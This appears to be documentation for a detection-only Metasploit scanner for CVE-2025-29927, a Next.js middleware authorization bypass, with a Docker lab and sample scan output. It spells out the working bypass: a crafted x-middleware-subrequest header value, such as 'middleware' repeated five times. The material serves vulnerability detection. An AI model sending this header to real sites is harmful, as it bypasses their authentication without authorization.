## Vulnerable Application

[Next.js](https://nextjs.org/) is a React framework. Self-hosted Next.js
applications (`next start` / standalone output) are affected by
[CVE-2025-29927](https://github.com/advisories/GHSA-f82v-jwr5-mffw), an
authorization bypass in the middleware layer (CVSS 9.1).

Next.js tags its own internal subrequests with the `x-middleware-subrequest`
header and skips middleware execution when it sees that header. The header is
trusted without verifying that it originated internally, so an external client
that supplies it causes middleware to be skipped entirely — bypassing any
authentication, authorization, redirects, or security headers implemented in
`middleware.ts`. The header value is the middleware module name (`middleware`, or
`src/middleware` when it lives under `src/`); on Next.js 13.2+ the name must be
repeated five times to satisfy the internal recursion-depth check.

Affected (self-hosted) versions:

| Branch | Affected | Patched |
|---|---|---|
| 15.x | `< 15.2.3` | 15.2.3 |
| 14.x | `< 14.2.25` | 14.2.25 |
| 13.x | `< 13.5.9` | 13.5.9 |
| 12.x / 11.1.4+ | `< 12.3.5` | 12.3.5 |

Vercel- and Netlify-hosted deployments are not affected (the platforms strip the
header).

This module performs a differential check against a user-supplied, normally
middleware-gated path: a baseline request (expecting a redirect or 401/403), then
the same request with a crafted `x-middleware-subrequest` header. If the gate
disappears, the target is vulnerable. It is detection only.

### Setup with Docker

The lab uses `node:` containers so the host does not need Node installed. The app
gates `/dashboard` behind a `session` cookie, redirecting unauthenticated requests
to `/login`.

Create the shared middleware:

```
mkdir -p ~/nextjs-cve-lab && cd ~/nextjs-cve-lab
cat > middleware.ts <<'EOF'
import { NextResponse } from 'next/server'
import type { NextRequest } from 'next/server'

export function middleware(req: NextRequest) {
  if (!req.cookies.get('session')) {
    return NextResponse.redirect(new URL('/login', req.url))
  }
  return NextResponse.next()
}

export const config = { matcher: ['/dashboard/:path*'] }
EOF
```

Vulnerable instance (Next.js 15.2.2) on port 3000:

```
docker run --rm -d --name next-vuln -p 3000:3000 -v "$PWD":/work -w /work node:20 bash -c '
  npx --yes create-next-app@15.2.2 app --ts --app --no-tailwind --no-eslint --no-src-dir --no-import-alias --use-npm &&
  cd app && cp /work/middleware.ts middleware.ts &&
  mkdir -p app/dashboard app/login &&
  printf "export default function P(){return <h1>SECRET DASHBOARD</h1>}\n" > app/dashboard/page.tsx &&
  printf "export default function L(){return <h1>LOGIN</h1>}\n" > app/login/page.tsx &&
  npm run build && npx --yes next start -p 3000 -H 0.0.0.0'
```

Patched instance (Next.js 15.2.3) on port 3001 — identical, pinning `15.2.3` and
mapping `-p 3001:3000`.

## Verification Steps

1. Start a vulnerable Next.js instance (see Setup with Docker)
1. Start `msfconsole`
1. Do: `use auxiliary/scanner/http/nextjs_middleware_auth_bypass`
1. Do: `set RHOSTS <target>`
1. Do: `set RPORT 3000`
1. Do: `set TARGETURI /dashboard`
1. Do: `run`
1. The module reports the bypass when the gated path becomes accessible under the header

## Options

### TARGETURI

A path that is normally gated by Next.js middleware — for example an authenticated
route that redirects unauthenticated users to a login page, or returns 401/403.
Defaults to `/dashboard`. The module reports "not applicable" if the baseline
request to this path is not gated.

### SUBREQUEST_PAYLOAD

Optional. Force a single `x-middleware-subrequest` value instead of trying the
built-in list (modern 5x `middleware`, `src/middleware`, single forms, and the
legacy `pages/_middleware`).

## Scenarios

### Next.js 15.2.2 (vulnerable)

```
msf6 > use auxiliary/scanner/http/nextjs_middleware_auth_bypass
msf6 auxiliary(scanner/http/nextjs_middleware_auth_bypass) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf6 auxiliary(scanner/http/nextjs_middleware_auth_bypass) > set TARGETURI /dashboard
TARGETURI => /dashboard
msf6 auxiliary(scanner/http/nextjs_middleware_auth_bypass) > set RPORT 3000
RPORT => 3000
msf6 auxiliary(scanner/http/nextjs_middleware_auth_bypass) > run

[+] 127.0.0.1:3000        - Next.js middleware authorization bypass confirmed (CVE-2025-29927): HTTP 307 -> /login -> HTTP 200 with x-middleware-subrequest 'middleware:middleware:middleware:middleware:middleware'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### Next.js 15.2.3 (patched, true-negative)

```
msf6 auxiliary(scanner/http/nextjs_middleware_auth_bypass) > set RPORT 3001
RPORT => 3001
msf6 auxiliary(scanner/http/nextjs_middleware_auth_bypass) > run

[*] 127.0.0.1:3001        - /dashboard gated (HTTP 307 -> /login); not bypassed (patched or not Next.js middleware)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
